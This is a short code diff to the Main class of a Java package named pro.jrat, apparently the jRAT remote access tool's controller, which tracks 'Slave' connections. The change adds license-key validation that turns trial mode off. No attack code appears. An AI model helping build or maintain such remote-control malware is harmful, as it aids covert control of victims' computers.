@@ -28,7 +28,7 @@ import pro.jrat.utils.TrayIconUtils;
 
 public class Main {
 	
-	public static final boolean TRIAL = true;
+	public static boolean TRIAL = true;
 	public static final List<Slave> connections = new ArrayList<Slave>();
 
 	public static boolean debug;
@@ -42,7 +42,17 @@ public class Main {
 			out.write(UniqueId.generateBinary());
 			out.close();
 			System.out.println("Wrote key to jrat.key");
-			return;
+			System.exit(0);
+		}
+		
+		try {
+			boolean validated = UniqueId.validate();
+			
+			if (validated) {
+				TRIAL = false;
+			}
+		} catch (Exception ex) {
+			ex.printStackTrace();
 		}
 		
 		debug = argsContains(args, "-debug");
